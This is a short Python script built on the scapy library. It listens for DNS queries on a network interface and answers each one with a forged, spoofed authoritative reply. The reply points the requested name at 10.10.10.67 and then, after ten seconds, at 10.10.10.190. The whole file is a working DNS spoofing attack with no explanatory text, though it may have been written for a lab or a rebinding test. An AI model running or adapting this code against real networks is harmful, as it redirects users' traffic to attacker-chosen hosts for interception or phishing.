#!/usr/bin/env python
# Import scapy libraries
from scapy.all import *
	
import time
net_interface = "eth1"	
print "[+] Listening"
IP_test = "10.10.10.67"
first = 0
packet_filter = " and ".join([
    "udp dst port 53",          # Filter UDP port 53
    "udp[10] & 0x80 = 0"       # DNS queries only
    ])
	
while True:
  if first == 0:
    first = time.time()
  
  if time.time() - first >= 10:
    IP_test = "10.10.10.190"
  
  def dns_reply(packet):
      eth = Ether(
          src=packet[Ether].dst,
          dst=packet[Ether].src
          )
      ip = IP(
          src=packet[IP].dst,
          dst=packet[IP].src
          )
      udp = UDP(
          dport=packet[UDP].sport,
          sport=packet[UDP].dport
          )
      dns = DNS(
          id=packet[DNS].id,
          qd=packet[DNS].qd,
          aa=1,
          rd=0, 
          qr=1,
          qdcount=1,
          ancount=1,
          nscount=0, 
          arcount=0,
          ar=DNSRR(
              rrname=packet[DNS].qd.qname,
              type='A',
              ttl=600,
              rdata=IP_test)
          )
      response_packet = eth / ip / udp / dns
      sendp(response_packet, iface=net_interface)
  sniff(filter=packet_filter, prn=dns_reply, store=0, iface=net_interface, count=1)










